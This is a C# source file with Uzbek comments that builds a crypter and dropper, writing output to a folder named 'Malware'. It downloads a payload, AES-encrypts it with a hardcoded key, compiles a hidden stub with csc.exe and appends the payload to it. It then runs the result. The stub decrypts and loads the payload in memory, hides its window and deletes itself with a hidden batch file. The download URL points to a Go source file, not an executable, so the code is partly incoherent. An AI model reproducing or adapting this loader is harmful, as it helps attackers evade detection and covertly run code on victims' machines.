using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace SecureFileDownloader
{
    class Program
    {
        // Windows API funksiyalari
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool DeleteFile(string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        static extern uint GetShortPathName(string lpszLongPath, StringBuilder lpszShortPath, uint cchBuffer);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main(string[] args)
        {
            // Konsolni yashirish
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            try
            {
                // URL ni aniq belgilash
                string url = "https://raw.githubusercontent.com/projectdiscovery/subfinder/dev/cmd/subfinder/main.go";

                // Avtomatik joy
                string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string outputPath = Path.Combine(desktopPath, "Malware", "output.exe");

                // Papka yaratish
                Directory.CreateDirectory(Path.GetDirectoryName(outputPath));

                // 1. Faylni yuklab olish
                byte[] fileContent = DownloadFile(url);

                // 2. Faylni shifrlash
                byte[] encryptedData = EncryptAndObfuscate(fileContent);

                // 3. Ishchi fayl yaratish
                CreateExecutable(encryptedData, outputPath);

                // 4. Faylni ishga tushirish va o'chirish
                RunAndDelete(outputPath);
            }
            catch (Exception ex)
            {
                // Xatoliklarni log qilish (faqat kerak bo'lsa)
                File.WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "error.log"), ex.ToString());
            }
        }

        static byte[] DownloadFile(string url)
        {
            using (WebClient client = new WebClient())
            {
                client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                client.Proxy = null;
                return client.DownloadData(url);
            }
        }

        static byte[] EncryptAndObfuscate(byte[] data)
        {
            using (Aes aes = Aes.Create())
            {
                aes.KeySize = 256;
                // Doimiy kalit va IV (real loyihada buni random qiling)
                aes.Key = Encoding.UTF8.GetBytes("12345678901234567890123456789012");
                aes.IV = Encoding.UTF8.GetBytes("1234567890123456");

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(data, 0, data.Length);
                        cs.FlushFinalBlock();
                    }
                    return ms.ToArray();
                }
            }
        }

        static void CreateExecutable(byte[] encryptedData, string outputPath)
        {
            // Soddalashtirilgan stub kodi
            string stubCode = @"
using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading;

namespace HiddenApp
{
    class Program
    {
        [DllImport(""kernel32.dll"")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport(""user32.dll"")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        static void Main()
        {
            // Konsolni yashirish
            ShowWindow(GetConsoleWindow(), 0);
            
            try
            {
                // Joriy fayldan ma'lumotlarni olish
                byte[] allBytes = File.ReadAllBytes(Assembly.GetExecutingAssembly().Location);
                
                // Shifrlangan ma'lumotlarni ajratish
                int stubSize = 8192; // Stub o'lchami
                if (allBytes.Length > stubSize)
                {
                    byte[] encrypted = new byte[allBytes.Length - stubSize];
                    Array.Copy(allBytes, stubSize, encrypted, 0, encrypted.Length);
                    
                    // Dekod qilish
                    byte[] original = DecryptData(encrypted);
                    
                    // Memory-ga yuklash va ishga tushirish
                    ExecuteInMemory(original);
                }
            }
            catch { }
            
            // O'zini o'chirish
            SelfDelete();
        }
        
        static byte[] DecryptData(byte[] encrypted)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(""12345678901234567890123456789012"");
                aes.IV = Encoding.UTF8.GetBytes(""1234567890123456"");
                
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(encrypted, 0, encrypted.Length);
                        cs.FlushFinalBlock();
                    }
                    return ms.ToArray();
                }
            }
        }
        
        static void ExecuteInMemory(byte[] assemblyBytes)
        {
            try
            {
                Assembly assembly = Assembly.Load(assemblyBytes);
                MethodInfo entryPoint = assembly.EntryPoint;
                if (entryPoint != null)
                {
                    // Background thread-da ishlatish
                    Thread thread = new Thread(() => {
                        try
                        {
                            entryPoint.Invoke(null, null);
                        }
                        catch { }
                    });
                    thread.IsBackground = true;
                    thread.Start();
                    
                    // Asosiy dastur tezroq tugashi uchun
                    Thread.Sleep(1000);
                }
            }
            catch { }
        }
        
        [DllImport(""kernel32.dll"", SetLastError = true)]
        static extern bool DeleteFile(string lpFileName);
        
        static void SelfDelete()
        {
            try
            {
                string batchPath = Path.Combine(Path.GetTempPath(), ""delete.bat"");
                string exePath = Assembly.GetExecutingAssembly().Location;
                
                // Batch fayl yaratish o'zini o'chirish uchun
                string batchContent = $@""@echo off
chcp 65001 > nul
timeout /t 1 /nobreak > nul
del """"{exePath}""""
del """"%~f0"""""";
                
                File.WriteAllText(batchPath, batchContent);
                
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = batchPath,
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                
                Process.Start(psi);
            }
            catch { }
        }
    }
}";

            // Stubni kompilyatsiya qilish
            string stubPath = Path.Combine(Path.GetTempPath(), "stub.cs");
            File.WriteAllText(stubPath, stubCode);

            // Kompilyator joylashuvi
            string[] compilerPaths = {
                @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
                @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe",
                @"C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\MSBuild\Current\Bin\Roslyn\csc.exe",
                @"C:\Program Files\Microsoft Visual Studio\2022\BuildTools\MSBuild\Current\Bin\Roslyn\csc.exe"
            };

            string compilerPath = null;
            foreach (var path in compilerPaths)
            {
                if (File.Exists(path))
                {
                    compilerPath = path;
                    break;
                }
            }

            if (compilerPath == null)
                throw new Exception("C# kompilyatori topilmadi");

            // Kompilyatsiya
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = compilerPath,
                Arguments = $"/target:winexe /out:\"{outputPath}\" /platform:x86 /unsafe \"{stubPath}\"",
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };

            using (Process process = Process.Start(psi))
            {
                process.WaitForExit(30000); // 30 soniya kutish

                if (!process.HasExited)
                    process.Kill();
            }

            // Stub faylni o'chirish
            try { File.Delete(stubPath); } catch { }

            // Shifrlangan ma'lumotlarni EXE fayliga qo'shish
            if (File.Exists(outputPath))
            {
                using (FileStream fs = new FileStream(outputPath, FileMode.Append, FileAccess.Write))
                {
                    fs.Write(encryptedData, 0, encryptedData.Length);
                }
            }
        }

        static void RunAndDelete(string filePath)
        {
            if (!File.Exists(filePath))
                return;

            // Faylni ishga tushirish
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = filePath,
                CreateNoWindow = true,
                UseShellExecute = false,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            try
            {
                Process.Start(psi);

                // 2 soniya kutib, keyin faylni o'chirishga urinish
                Thread.Sleep(2000);

                try
                {
                    File.Delete(filePath);
                }
                catch
                {
                    // Agar o'chirish muvaffaqiyatsiz bo'lsa, boshqa usul
                    ScheduleDelete(filePath);
                }
            }
            catch { }
        }

        static void ScheduleDelete(string filePath)
        {
            // Move + delete usuli
            try
            {
                string tempPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
                File.Move(filePath, tempPath);

                // Background thread orqali o'chirish
                Thread thread = new Thread(() =>
                {
                    Thread.Sleep(3000);
                    try { File.Delete(tempPath); } catch { }
                });
                thread.IsBackground = true;
                thread.Start();
            }
            catch { }
        }
    }
}
